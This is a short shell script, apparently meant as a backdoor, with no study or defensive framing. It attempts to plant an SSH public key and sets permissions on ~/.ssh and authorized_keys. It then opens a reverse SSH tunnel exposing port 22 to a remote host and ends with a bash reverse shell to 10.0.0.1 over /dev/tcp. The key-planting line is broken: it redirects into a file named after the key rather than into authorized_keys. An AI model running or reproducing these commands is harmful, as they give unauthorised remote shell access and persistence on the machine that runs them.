#!/bin/sh

cat ~/.ssh/id_rsa.pub >> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCg93LzQMMQzeKp0S2R+97YjX6VB/wBNB7WjF6Ra+iVVMur0t4vhwQ5uVN3fMHPe7zoWUUuTJwrEbvdnjLjE1eBZSNMqsIgvqC2b6rCAEkIgyx8aKvC9xNeYqvLsXQhD0vpqnG8Mt5Vnc6pbhA5+0Ihqc96izLCkSSbD0/u5MfQZZFKI5WcbKPgeA1bl84Z7Nu0dVB59CrLKt7CpWYaa0BgXcdE6h4C4wp7SkdJ0ObXhakdiOJjumbp/bKphjMtztq+5J1gDXxG8g2WRjBNI8bDGB7Jurs8Gy1AbuMUm8rPEklxjZpmCv2eZQQvwchTjB2X6KCgPPWOO30z+zZL+KMiaDjNhq/4wawAlNg6t70mW+hl5CgNJ5VwxYLfkemvj7ksPYgS3Aobjwqb1CdSiiiYOLZjVjhePNkq5ZkWSGsbEg9O9yil41iarjeeCAYbitdzaJyEOukCpXOMzI60O9h8FvDdq98si91LSGdqpVEcyXf4OlWNSzImoZnVZuGNwqU= alkin@DESKTOP-GOI0OEG

chmod 700 ~/
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

ssh -N -R 9999:localhost:22 alkin@DESKTOP-GOI0OE

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

